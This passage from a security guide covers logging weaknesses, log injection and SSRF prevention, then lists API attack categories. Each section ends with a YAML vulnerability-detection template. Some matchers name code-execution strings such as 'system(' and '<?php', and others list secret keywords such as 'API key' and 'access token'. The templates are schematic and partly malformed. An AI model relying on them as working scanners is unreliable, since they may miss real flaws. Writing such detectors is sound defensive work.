1. Include contextual information: Log additional contextual information that can aid in incident investigation, such as user IDs, timestamps, source IP addresses, affected resources, and relevant request/response data. This information can assist in understanding the scope and impact of security incidents.

1. Set appropriate log levels: Define appropriate log levels for different types of events, ranging from debug and informational messages to more critical error and warning logs. Use log levels consistently to capture both routine and exceptional events.

1. Ensure log storage and retention: Set up sufficient storage capacity to retain logs for an adequate period, considering compliance requirements and incident response needs. Retain logs for a timeframe that allows for timely incident detection, response, and forensic analysis.

1. Encrypt and protect logs: Apply encryption mechanisms to protect log files at rest and during transit. Properly configure file permissions and access controls to prevent unauthorized access to log files. Protect log files from tampering or deletion by employing file integrity monitoring or secure log management systems.

1. Monitor log files: Regularly monitor log files for any suspicious or unexpected activities. Implement automated log analysis and intrusion detection systems to detect security events, anomalies, or patterns indicative of potential attacks.

1. Implement centralized log management: Centralize log storage and management in a dedicated log server or security information and event management (SIEM) system. Centralization enables correlation and analysis of logs from multiple sources, improving incident detection and response capabilities.

1. Perform log analysis and reporting: Regularly analyze log data for security insights, trends, or anomalies. Create customized reports or dashboards that provide a summary of important security-related events. Identify areas for improvement or potential security weaknesses based on log analysis results.

1. Implement log integrity checks: Implement mechanisms to detect and alert on any tampering or modification of log files. Use digital signatures, checksums, or secure logging frameworks to ensure the integrity of log data.

1. Regularly review and update logging practices: Continuously review and update your logging practices based on evolving security requirements and industry best practices. Stay informed about emerging threats and logging-related vulnerabilities to ensure your logging mechanisms remain effective.

By implementing these preventive measures, you can enhance your application's logging capabilities, facilitate incident detection and response, and improve your overall security posture. Comprehensive and secure logging practices play a vital role in detecting and investigating security incidents, aiding in timely incident response, and facilitating forensic analysis when necessary.


```
id: insufficient-logging
info:
  name: Insufficient Logging
  author: Your Name
  severity: medium
  description: Detects vulnerabilities related to insufficient logging of security events.
  references:
    - https://example.com
tags:
  - web
  - logging
requests:
  - name: Insufficient Logging
    path:
      - /login
      - /admin
      - /api/v1
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Login failed"
      - type: word
        words:
          - "Unauthorized access"
      - type: word
        words:
          - "Access denied"
```


### Improper Output Neutralization for Logs


Improper Output Neutralization for Logs, also known as Log Injection, is a security vulnerability that occurs when untrusted user input is not properly sanitized or neutralized before being included in log statements. This can lead to log forging, injection of malicious content, or the disclosure of sensitive information within log files.

To prevent Improper Output Neutralization for Logs, you should follow these preventive measures:

1. Apply proper input validation and sanitization: Treat log messages as untrusted user input and validate and sanitize any user-controlled data before including it in log statements. Remove or escape characters that could be interpreted as control characters or log syntax.

1. Use secure logging frameworks: Utilize logging frameworks that provide built-in mechanisms for proper output neutralization. These frameworks often include features like parameterized logging or context-specific escaping, which can help prevent log injection vulnerabilities.

1. Avoid concatenation of untrusted data: Do not concatenate untrusted user input directly into log statements. Instead, use placeholder values or formatting options provided by the logging framework to ensure proper neutralization of user-controlled data.

1. Implement context-specific output encoding: If the logging framework does not provide automatic neutralization mechanisms, implement context-specific output encoding to prevent injection attacks. Use the appropriate encoding technique based on the log format and syntax, such as HTML entity encoding or URL encoding.

1. Limit the verbosity of log messages: Be mindful of the information logged and avoid including sensitive data in log statements. Only log the necessary details required for troubleshooting or auditing purposes, while excluding sensitive information like passwords, Personally Identifiable Information (PII), or authentication tokens.

1. Configure log file permissions: Ensure that log files have appropriate permissions to restrict unauthorized access. Restrict read and write permissions to only authorized users or system processes. Regularly monitor and manage access control settings for log files.

1. Implement centralized log management: Centralize log storage and management in a dedicated log server or a Security Information and Event Management (SIEM) system. Centralization allows for better control, monitoring, and analysis of log data, minimizing the risk of log injection and facilitating detection of suspicious activities.

1. Regularly monitor and review logs: Regularly review log files for any signs of log injection attempts or suspicious log entries. Implement automated log analysis and intrusion detection systems to identify potential log injection attacks or anomalous log patterns.

1. Keep logging frameworks up to date: Keep your logging frameworks and libraries up to date with the latest security patches and updates. Stay informed about any security advisories or vulnerabilities related to the logging components used in your application.

1. Educate developers: Provide training and guidance to developers on secure coding practices for logging. Emphasize the importance of proper input validation, output neutralization, and the risks associated with log injection vulnerabilities.

By implementing these preventive measures, you can mitigate the risk of Improper Output Neutralization for Logs and ensure that your log files remain reliable, accurate, and free from malicious content. Proper input validation, secure logging frameworks, context-specific output encoding, and regular log monitoring are essential steps to prevent log injection vulnerabilities.


```
id: improper-output-neutralization-logs
info:
  name: Improper Output Neutralization for Logs
  author: Your Name
  severity: medium
  description: Detects vulnerabilities related to improper output neutralization in log messages.
  references:
    - https://example.com
tags:
  - web
  - logging
requests:
  - name: Improper Output Neutralization for Logs
    path:
      - /login
      - /admin
      - /api/v1
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{*}}"
      - type: word
        words:
          - "<?php"
      - type: word
        words:
          - "system("
```


### Omission of Security-relevant Information

Omission of Security-relevant Information is a security vulnerability that occurs when an application fails to log or report important security-related events or incidents. This omission can result in a lack of visibility into potential security threats or the inability to detect and respond to security incidents in a timely manner.

To prevent the Omission of Security-relevant Information, you should follow these preventive measures:

1. Identify security-relevant events: Determine the types of security-related events that are crucial for monitoring and detection within your application. This may include failed login attempts, access control failures, suspicious activities, or any other security-related incidents specific to your application and environment.

1. Implement comprehensive logging: Ensure that your application logs all identified security-relevant events. Log the necessary details such as timestamps, user information, affected resources, and relevant context that can assist in incident investigation and response.

1. Set appropriate log levels: Define appropriate log levels for different security events based on their criticality. Use log levels consistently to ensure that security-relevant events are captured and logged accordingly.

1. Implement centralized log management: Centralize log storage and management in a dedicated log server or a Security Information and Event Management (SIEM) system. Centralization allows for better visibility, correlation, and analysis of security events across your application or infrastructure.

1. Regularly review and analyze logs: Establish a routine practice of reviewing and analyzing logs for security events and incidents. Assign responsibility to a designated team or individual to regularly monitor and analyze log data for any potential security threats or anomalies.

1. Implement log retention policies: Define log retention policies that align with your compliance requirements and incident response needs. Retain logs for an appropriate period to ensure that historical data is available for security investigations or forensic analysis.

1. Automate log analysis: Implement automated log analysis tools or intrusion detection systems to assist in the detection of security events or anomalies. Use these tools to monitor log files in real-time and generate alerts or notifications for potential security incidents.

1. Implement real-time monitoring: Use real-time monitoring techniques to actively track and respond to security events as they occur. Implement mechanisms such as log streaming, event triggers, or alerting systems to ensure prompt notifications and response to security incidents.

1. Perform regular security assessments: Conduct regular security assessments and penetration testing to identify any gaps or vulnerabilities in your application's logging and monitoring capabilities. Use the results of these assessments to make necessary improvements and address any security weaknesses.

1. Stay updated with security best practices: Stay informed about the latest security best practices, frameworks, and guidelines related to logging and security monitoring. Regularly update your logging mechanisms and practices to align with industry standards and emerging security threats.

By implementing these preventive measures, you can ensure that security-relevant information is properly logged and reported, enabling effective detection and response to security incidents. Comprehensive and accurate logging practices are essential for maintaining the security of your application and infrastructure, facilitating incident investigations, and supporting compliance requirements.


```
id: omission-security-relevant-info
info:
  name: Omission of Security-relevant Information
  author: Your Name
  severity: high
  description: Detects vulnerabilities related to the omission of security-relevant information in error messages or responses.
  references:
    - https://example.com
tags:
  - web
  - security
requests:
  - name: Omission of Security-relevant Information
    path:
      - /login
      - /admin
      - /api/v1
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Unauthorized"
      - type: word
        words:
          - "Forbidden"
      - type: word
        words:
          - "Access denied"
```

### Sensitive Information into Log File

Sensitive Information into Log File refers to the unintentional logging or inclusion of sensitive data within log files. This can occur when application logs capture and store sensitive information such as passwords, credit card numbers, personally identifiable information (PII), or any other confidential data. Storing sensitive information in log files poses a significant security risk as it increases the potential for unauthorized access, data leakage, and compliance violations.

To prevent the inclusion of sensitive information into log files, consider the following preventive measures:

1. Implement a logging policy: Define a logging policy that explicitly prohibits the logging of sensitive information. Clearly outline what types of data should not be included in log files and educate developers and system administrators about the policy.

1. Apply proper data sanitization: Implement proper data sanitization techniques to prevent sensitive information from being logged inadvertently. Develop a logging framework or use existing libraries that automatically redact or obfuscate sensitive data before logging. Apply techniques such as masking, truncation, or encryption to protect sensitive information.

1. Utilize appropriate log levels: Ensure that sensitive information is not logged at inappropriate log levels. Set log levels in a way that sensitive data is not included in logs intended for debugging, development, or general information purposes. Properly categorize log levels based on the sensitivity of the information being logged.

1. Avoid logging sensitive input parameters: Exercise caution when logging input parameters, especially if they contain sensitive data. If necessary, consider logging only non-sensitive portions of the input data or use a whitelist approach to explicitly exclude sensitive fields from being logged.

1. Implement log filtering: Apply log filtering mechanisms to remove or obfuscate sensitive information from log files. Use regular expressions or predefined patterns to detect and filter out sensitive data before it is stored in log files. Regularly review and update the filtering rules as necessary.

1. Use secure logging storage: Ensure that log files are stored securely with appropriate access controls. Limit access to log files to authorized personnel only. Implement encryption or encryption at rest mechanisms to protect log files from unauthorized access or disclosure.

1. Regularly review log files: Perform regular log file reviews to identify any instances of sensitive information being logged. Implement automated log analysis tools or manual inspection techniques to detect and remediate any inadvertent logging of sensitive data.

1. Pseudonymize or anonymize data: If there is a need to log certain sensitive information for debugging or analysis purposes, consider pseudonymizing or anonymizing the data. Replace actual sensitive values with pseudonyms or anonymized identifiers to protect the privacy and confidentiality of the data.

1. Establish proper access controls: Implement strict access controls for log files, including file permissions and user authentication mechanisms. Only grant access to log files to authorized individuals who require it for operational or security purposes.

1. Train and educate personnel: Provide training and education to developers, system administrators, and other personnel involved in log file management. Raise awareness about the risks associated with logging sensitive information and promote best practices for secure logging.

By implementing these preventive measures, you can reduce the risk of sensitive information being unintentionally logged and stored in log files. Taking proactive steps to protect the confidentiality and integrity of log data helps maintain compliance with data protection regulations, mitigates the risk of data breaches, and preserves the privacy of sensitive information.


```
id: sensitive-info-log-file
info:
  name: Sensitive Information into Log File
  author: Your Name
  severity: high
  description: Detects vulnerabilities related to logging sensitive information into log files.
  references:
    - https://example.com
tags:
  - web
  - security
requests:
  - name: Sensitive Information into Log File
    path:
      - /
    matchers:
      - type: status
        status:
          - 200
    responses:
      - type: word
        words:
          - "password"
          - "credit card"
          - "social security number"
      - type: word
        words:
          - "private key"
          - "API key"
          - "access token"
```



### Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to manipulate the server-side functionality of an application to make arbitrary requests on behalf of the server. The attacker typically exploits this vulnerability to interact with internal resources, perform port scanning, or make requests to other external systems. SSRF attacks can lead to sensitive data exposure, unauthorized access to internal resources, and potential remote code execution.

To prevent Server-Side Request Forgery (SSRF) vulnerabilities, consider the following preventive measures:

1. Input validation and whitelisting: Implement strong input validation and enforce strict whitelisting of allowed URLs or domains. Validate and sanitize user-supplied input, such as URLs or IP addresses, to prevent injection of malicious or unexpected values. Use a whitelist of trusted domains or IP addresses that the server is allowed to communicate with.

1. Restrict network access: Configure network firewalls and security groups to restrict outbound network access from the server. Only allow connections to necessary resources and services, blocking access to internal or sensitive systems that should not be accessed by the server.

1. Use secure protocols and APIs: When making outgoing requests, use secure protocols such as HTTPS to communicate with external systems. Validate the SSL/TLS certificates of the target servers to ensure the integrity and authenticity of the communication. Avoid using insecure or deprecated protocols and APIs that may be vulnerable to SSRF attacks.

1. Isolate server components: Utilize network segmentation and isolate server components to prevent direct access to internal resources. Place servers in separate network segments or subnets, and restrict their access to only necessary resources and services.

1. Configure strong server-side controls: Implement server-side controls to prevent SSRF attacks. This may include implementing allowlists of allowed protocols, ports, and domains, as well as enforcing appropriate security policies at the server level.

1. Implement request validation and filtering: Validate and filter user-supplied URLs and input to ensure they conform to expected patterns and protocols. Consider using security libraries or frameworks that provide built-in protection against SSRF attacks, such as URL validation and sanitization functions.

1. Least privilege principle: Ensure that the server's permissions and privileges are limited to what is necessary for its intended functionality. Avoid running the server with excessive privileges or accessing sensitive resources that are not required for its operation.

1. Secure session management: Implement secure session management practices, including strong session identifiers, session expiration, and secure session storage. This helps prevent attackers from leveraging SSRF vulnerabilities to hijack active sessions or perform unauthorized actions.

1. Regular security updates and patches: Keep server software, libraries, and frameworks up to date with the latest security patches and updates. SSRF vulnerabilities can be present in various components, including web servers, frameworks, or third-party libraries. Regularly monitor and apply security updates to mitigate known vulnerabilities.

1. Perform security testing and code review: Conduct regular security testing, including vulnerability scanning and penetration testing, to identify and remediate SSRF vulnerabilities. Additionally, perform code reviews to identify potential SSRF-prone code patterns and ensure secure coding practices are followed.

By implementing these preventive measures, you can significantly reduce the risk of SSRF vulnerabilities and protect your application from unauthorized access to internal resources and potential data breaches. It is important to adopt a security-first mindset throughout the application development lifecycle and regularly assess and enhance the security posture of your systems.


```
id: ssrf-detection
info:
  name: Server-Side Request Forgery (SSRF) Detection
  author: Your Name
  severity: high
  description: Detects vulnerabilities related to Server-Side Request Forgery (SSRF) attacks.
  references:
    - https://example.com
tags:
  - web
  - security
requests:
  - name: SSRF Detection
    path:
      - /
    matchers:
      - type: status
        status:
          - 200
    match:
      - type: word
        words:
          - "Internal Server Error"
          - "Connection refused"
          - "Invalid URL"
      - type: regex
        part: body
        regex: '(https?|ftp)://[^/]+'
```


## API

### Category: Broken Access Control

Inadequate enforcement of access controls, allowing unauthorized users to access sensitive resources or perform unauthorized actions.
Example of attacks: Accessing restricted data or functionality, privilege escalation, horizontal/vertical privilege escalation.

### Category: Excessive Data Exposure

APIs exposing more data than necessary, potentially leaking sensitive information.
Example of attacks: Exposure of personally identifiable information (PII), financial data, or sensitive business data through API responses.

### Category: Broken Authentication

Flaws in authentication mechanisms that can lead to unauthorized access or account takeover.
Example of attacks: Credential stuffing, session fixation, brute-forcing authentication tokens or passwords.

### Category: Injection Attacks

Lack of proper input validation and sanitization, enabling attackers to inject malicious code or exploit vulnerabilities.
Example of attacks: SQL injection, OS command injection, XML/XXE injection, NoSQL injection.

### Category: Improper Error Handling

APIs revealing excessive or sensitive error details, which can aid attackers in exploiting vulnerabilities.
Example of attacks: Information disclosure, error-based enumeration, bypassing security controls using error messages.

### Category: Security Misconfiguration

Poorly configured API settings, default credentials, or inadequate security configurations.
Example of attacks: Unauthorized access to API endpoints, access to sensitive configuration data, exploitation of default credentials.

### Category: Insecure Direct Object References

Improper access control mechanisms that allow attackers to directly reference internal objects or resources.
Example of attacks: Accessing other users' data, tampering with internal object references, bypassing authorization checks.

### Category: Insufficient Logging and Monitoring

Lack of proper logging and monitoring, hindering the detection and response to security incidents.
Example of attacks: Unauthorized access attempts, API abuse, suspicious activity going unnoticed due to insufficient logging.

### Category: Insecure Serverless Deployments

Security weaknesses in serverless architectures, including issues with configuration, event handling, and access controls.
Example of attacks: Unauthorized execution of serverless functions, sensitive data exposure through serverless configurations.

### Category: Denial of Service (DoS)

Vulnerabilities that can be exploited to overload or disrupt the availability of API services.
Example of attacks: Sending excessive requests, resource exhaustion, API rate limiting bypass, flooding API endpoints.


### Ref

* https://capec.mitre.org/index.html

